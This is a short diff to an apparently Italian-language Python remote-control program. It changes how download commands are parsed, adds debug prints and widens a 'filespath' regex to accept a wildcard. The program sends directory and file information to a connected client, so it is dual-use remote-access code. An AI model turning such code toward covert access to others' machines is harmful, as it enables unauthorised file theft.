@@ -215,6 +215,7 @@ def find(comando, client):
 
 
 def download(comando, client):
+
     counter_virgolette = 0
     counter_spazi = 0
     inizio_file = 0
@@ -223,7 +224,9 @@ def download(comando, client):
     file = 'null'
     path = 'null'
     regex_match = 'null'
+
     regex_match = regexcheck_download(comando)
+
     if regex_match != 'null' and regex_match != 'not matched':
         if regex_match == 'windowstip1' or regex_match == 'unixtip1':
             # tipologia 1: (simile a find) download "nomefile.estensione" path
@@ -248,10 +251,14 @@ def download(comando, client):
                     elif counter_virgolette == 2:
                         fine_file = element
                 if comando[element] == ":" and counter_virgolette == 2:
-                    inizio_path = element + 1
+                    inizio_path = element + 2
 
         file = comando[inizio_file:fine_file]
         path = comando[inizio_path:]
+
+        print(path)
+        print(file)
+
         # distinguere il tipo di path per utilizzare os.path.getsize
         pathtoremember = 'null'
         if path == ".":
@@ -424,7 +431,7 @@ def openRemoteControl(client):
                 client.send((os.getcwd()).encode(FORMAT))
 
             elif comando[0:9] == "filespath":
-                reg = "^filespath .[a-z]{1,4}"
+                reg = "^filespath .[a-z]{1,4}|^filespath (\*)"
                 if(re.match(reg, comando)):
                     try:
                         estensione = comando[10:]
